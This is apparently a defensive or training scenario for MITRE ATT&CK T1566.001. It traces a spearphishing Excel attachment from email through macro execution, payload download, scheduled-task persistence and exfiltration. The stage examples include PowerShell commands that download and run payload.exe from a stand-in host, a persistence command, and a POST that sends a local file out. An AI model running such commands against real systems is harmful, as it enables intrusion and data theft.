Pattern Name: T1566.001 - Spearphishing Attachment

Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment designed to exploit a vulnerability in Microsoft Excel. The attack progresses from the initial email interaction to the execution of a payload that establishes a foothold in the victim's environment.

Attack Flow Breakdown:

**Stage 1: Initial Access via Email**
- **Applications Involved**: Outlook
- **User Action**: The user receives an email with a subject line "Important Document" and an attachment named "Invoice_2023.xlsx".
- **Key Artifacts**: Email headers, attachment file (Invoice_2023.xlsx).
- **Description**: The attacker crafts a convincing email to entice the user to open the attachment.

**Stage 2: Opening the Malicious Attachment**
- **Applications Involved**: Microsoft Excel
- **User Action**: The user opens the attachment in Excel.
- **Key Artifacts**: Excel file (Invoice_2023.xlsx), potentially malicious macros.
- **Description**: The Excel file contains embedded macros that are set to run automatically when the file is opened.

```shell
# The user opens the Excel file, triggering the execution of macros.
# The macros may contain commands to download and execute a payload.
```

**Stage 3: Macro Execution and Payload Download**
- **Applications Involved**: Excel, PowerShell
- **User Action**: The macros execute, which may include a PowerShell command to download a malicious payload from a remote server.
- **Key Artifacts**: PowerShell command, URL of the malicious payload (e.g., http://malicious-server.com/payload.exe).
- **Description**: The macros execute a PowerShell command that downloads a malicious executable.

```shell
# PowerShell command executed by the macro to download the payload.
powershell -Command "Invoke-WebRequest -Uri 'http://malicious-server.com/payload.exe' -OutFile '$env:TEMP\payload.exe'"
```

**Stage 4: Execution of the Malicious Payload**
- **Applications Involved**: PowerShell, Windows Explorer
- **User Action**: The downloaded payload is executed, either automatically or through user interaction.
- **Key Artifacts**: Executable file (payload.exe), process creation logs.
- **Description**: The payload is executed, establishing a backdoor or remote access tool on the victim's machine.

```shell
# The payload is executed, potentially creating a new process for persistence.
start $env:TEMP\payload.exe
```

**Stage 5: Establishing Persistence**
- **Applications Involved**: Windows Task Scheduler, Registry
- **User Action**: The payload may create a scheduled task or modify the registry to ensure it runs on startup.
- **Key Artifacts**: Scheduled task entries, registry keys.
- **Description**: The attacker ensures that the malicious payload runs on system startup to maintain access.

```shell
# Command to create a scheduled task for persistence.
schtasks /create /tn "MaliciousTask" /tr "$env:TEMP\payload.exe" /sc onlogon /rl highest
```

**Stage 6: Data Exfiltration or Lateral Movement**
- **Applications Involved**: PowerShell, Network
- **User Action**: The attacker may use the established foothold to exfiltrate data or move laterally within the network.
- **Key Artifacts**: Network traffic logs, exfiltrated files.
- **Description**: The attacker uses the compromised system to gather sensitive information or access other systems in the network.

```shell
# Example command to exfiltrate data to an external server.
powershell -Command "Invoke-WebRequest -Uri 'http://malicious-server.com/exfil' -Method POST -Body (Get-Content 'C:\sensitive_data.txt')"
```
